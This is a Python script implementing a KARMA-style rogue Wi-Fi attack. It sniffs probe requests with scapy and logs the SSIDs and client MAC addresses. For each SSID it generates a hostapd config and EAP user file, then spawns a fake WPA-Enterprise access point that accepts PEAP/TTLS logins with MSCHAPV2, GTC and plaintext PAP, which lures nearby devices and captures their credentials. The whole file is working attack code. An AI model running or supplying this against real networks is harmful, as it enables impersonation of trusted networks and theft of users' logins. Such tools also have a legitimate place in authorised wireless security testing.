from scapy.all import Dot11, Dot11Elt, Dot11ProbeReq, sniff
import subprocess
import os

captured_ssids = set()
_monitor_iface = "wlan0mon"  # Updated by start_karma()

def karma_handler(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore").strip()
        except Exception:
            return

        if ssid and ssid not in captured_ssids:
            captured_ssids.add(ssid)
            print(f"[KARMA] Probe detected → SSID: '{ssid}' | Client MAC: {pkt.addr2}")
            spawn_ap_for_ssid(ssid, _monitor_iface)


def spawn_ap_for_ssid(ssid, iface="wlan0mon"):
    base_dir = os.path.dirname(os.path.abspath(__file__))
    cert_dir = os.path.join(base_dir, "certs")

    # Ensure EAP user file exists (needed by hostapd)
    eap_user_path = "/tmp/hostapd.eap_user"
    if not os.path.exists(eap_user_path):
        eap_user_content = """*       PEAP,TTLS,TLS,FAST
"t"*    GTC,MSCHAPV2,MD5,TTLS-PAP    [2]
"""
        with open(eap_user_path, "w") as f:
            f.write(eap_user_content)

    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file={eap_user_path}
ca_cert={cert_dir}/ca.pem
server_cert={cert_dir}/server.pem
private_key={cert_dir}/server.key
"""
    safe_ssid = ssid.replace(" ", "_").replace("/", "")
    conf_path = f"/tmp/karma_{safe_ssid}.conf"

    with open(conf_path, "w") as f:
        f.write(conf)

    subprocess.Popen(
        ["hostapd", conf_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print(f"[KARMA] Spawned AP for SSID: '{ssid}'")


def start_karma(iface):
    global _monitor_iface
    _monitor_iface = iface
    print(f"[*] KARMA mode active on {iface} — listening for probe requests...")
    sniff(iface=iface, prn=karma_handler, store=0,
          filter="type mgt subtype probe-req")
